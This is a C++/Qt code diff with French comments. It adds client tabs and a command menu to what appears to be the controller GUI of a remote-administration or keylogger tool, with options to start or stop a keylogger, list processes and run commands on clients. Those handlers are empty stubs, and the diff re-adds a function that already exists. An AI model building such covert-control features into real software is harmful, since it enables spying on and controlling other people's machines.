@@ -65,3 +65,78 @@ void MainWindow::appendClientOutput(const QString& clientId, const QString& text
     if (!clientTabs.contains(clientId)) return;
     clientTabs[clientId]->addItem(text);
 }
+
+void MainWindow::addClientTab(const QString& clientId) {
+    if (clientTabs.contains(clientId)) return;
+
+    // 1) Créer le widget de page et son layout
+    QWidget* page = new QWidget;
+    QVBoxLayout* vlay = new QVBoxLayout(page);
+
+    // 2) La zone d’output
+    QListWidget* outList = new QListWidget;
+    vlay->addWidget(outList);
+
+    // 3) La ligne de commande + bouton d’envoi
+    QHBoxLayout* hlay = new QHBoxLayout;
+    QLabel* lbl = new QLabel("Message :");
+    QLineEdit* edit = new QLineEdit;
+    QPushButton* btn = new QPushButton("Envoyer");
+    hlay->addWidget(lbl);
+    hlay->addWidget(edit);
+    hlay->addWidget(btn);
+    vlay->addLayout(hlay);
+
+    // 4) Ajouter dans le QTabWidget
+    int idx = ui->tabWidget->addTab(page, clientId);
+    ui->tabWidget->setCurrentIndex(idx);
+
+    // 5) Sauvegarder la QListWidget pour mises à jour futures
+    clientTabs[clientId] = outList;
+
+    // 6) Connecter le bouton pour émettre un signal vers ton contrôleur réseau
+    connect(btn, &QPushButton::clicked, this, [this, clientId, edit]() {
+        QString msg = edit->text();
+        if (msg.isEmpty()) return;
+        emit sendToClient(clientId, msg);  // tu définis un signal sendToClient(...)
+        edit->clear();
+    });
+}
+
+void MainWindow::appendClientOutput(const QString& clientId, const QString& text) {
+    if (!clientTabs.contains(clientId)) return;
+    clientTabs[clientId]->addItem(text);
+}
+
+void MainWindow::onSelectionButtonClicked() {
+ int idx = ui->comboBox->currentIndex();
+ QListWidgetItem* selectedItem = ui->clientListWidget->currentItem();
+     if (!selectedItem) {
+        QMessageBox::warning(this, "Attention", "Veuillez sélectionner un client !");
+        return;
+    }
+    QString selectedClient = selectedItem->text();
+    switch (idx) {
+        case 0:
+            // Afficher les informations du client
+            // ... call your logic here
+            break;
+        case 1:
+            // Démarrer le keylogger
+            break;
+        case 2:
+            // Eteindre le keylogger
+            break;
+        case 3:
+            // Afficher la liste complète des processus
+            break;
+        case 4:
+            // Afficher la liste des processus (noms)
+            break;
+        case 5:
+            // Exécuter une commande
+            break;
+        default:
+            break;
+    }
+}
